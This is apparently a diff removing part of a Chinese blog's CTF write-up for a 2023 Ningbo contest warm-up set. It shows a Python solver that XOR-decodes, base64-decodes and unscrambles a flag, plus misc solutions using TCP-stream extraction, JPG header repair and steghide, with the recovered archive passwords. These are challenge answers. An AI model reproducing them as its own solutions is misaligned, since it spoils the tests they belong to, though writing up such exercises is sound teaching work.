-</code></pre>
-<p>解密脚本</p>
-<pre><code class="python">import base64
-Str = []
-Str.append(51)
-Str.append(102)
-Str.append(39)
-Str.append(60)
-Str.append(39)
-Str.append(45)
-Str.append(40)
-Str.append(18)
-Str.append(36)
-Str.append(107)
-Str.append(109)
-Str.append(17)
-Str.append(36)
-Str.append(61)
-Str.append(113)
-Str.append(25)
-Str.append(48)
-Str.append(4)
-Str.append(39)
-Str.append(4)
-Str.append(36)
-Str.append(19)
-Str.append(43)
-Str.append(60)
-Str.append(38)
-Str.append(45)
-Str.append(109)
-Str.append(21)
-Str.append(51)
-Str.append(107)
-Str.append(104)
-Str.append(61)
-Str.append(38)
-Str.append(45)
-Str.append(63)
-Str.append(7)
-Str.append(39)
-Str.append(107)
-Str.append(105)
-Str.append(18)
-Str.append(53)
-Str.append(106)
-Str.append(18)
-Str.append(21)
-Str.append(51)
-Str.append(7)
-Str.append(13)
-Str.append(59)
-Str.append(51)
-Str.append(45)
-Str.append(7)
-Str.append(99)
-res = &#39;&#39;
-v7 = 38
-
-for i in range(0,52):
-    Str[i] ^= 0x5E;
-    res = res + chr(Str[i])
-bd_res = base64.b64decode(res)
-
-res2 = []
-for i in range(len(bd_res)):
-    res2.append(bd_res[i])
-    
-def swap(a1,a2):
-    tmp = res2[a1]
-    res2[a1] = res2[a2]
-    res2[a2] = tmp
-for j in range(99,-1,-1):
-    swap((j+8)%v7, (j+9)%v7)
-    swap((j+3)%v7, (j+10)%v7)
-    swap((j+1)%v7, (j+7)%v7)
-    swap((j+5)%v7, (j+2)%v7)
-flag = &#39;&#39;
-for i in range(len(res2)):
-    res2[i] = 255 - res2[i]
-    flag += chr(res2[i])
-print(flag)
-</code></pre>
-<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="welcome"><a href="#welcome" class="headerlink" title="welcome"></a>welcome</h2><p>追踪tcp流导出rar包</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/8f9da213dee9854aa0ce71702e856bdc.png" alt="image-20230510124343152">得知密码是da19b65c17dc</p>
-<p>解压得到flag</p>
-<h2 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h2><p>追踪tcp流,导出zip包</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/ed305a1e49f6d319dedfd4395889f5cb.png" alt="image-20230509115200536"></p>
-<p>里面一个password文件一个加密的文件</p>
-<p>password文件尾是jpg</p>
-<p>补个文件头FF D8</p>
-<p>然后爆破宽高</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/05dc18a08943da1f9cd3882af38f1289.png" alt="image-20230509115738296"></p>
-<p>改720</p>
-<p>发现类似密码的东西</p>
-<p>拿去解压缩包发现不对,一个个隐写工具试过去</p>
-<p>发现steghide可行</p>
-<p>得到密码</p>
-<p>NjBjNDk3YmMxOTM4YzhkNA&#x3D;&#x3D;</p>
-<p>60c497bc1938c8d4</p>
-<p>解压得到flag</p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #03a9f4">开发语言</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/php/" style="color: #00a596">php</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/linux/" style="color: #03a9f4">linux</a>
-        </span>
-        
-    </div>
-    <a href="/2023/05/16/2023%E5%AE%81%E6%B3%A2%E5%B8%82%E8%B5%9B%20%E5%A4%A9%E4%B8%80%E6%B0%B8%E5%AE%89%E6%9D%AF%E8%B5%9B%E5%89%8D%E6%A8%A1%E6%8B%9F%E9%A2%98%E9%83%A8%E5%88%86wp/" class="go-post">阅读全文</a>
 </div>
 
 
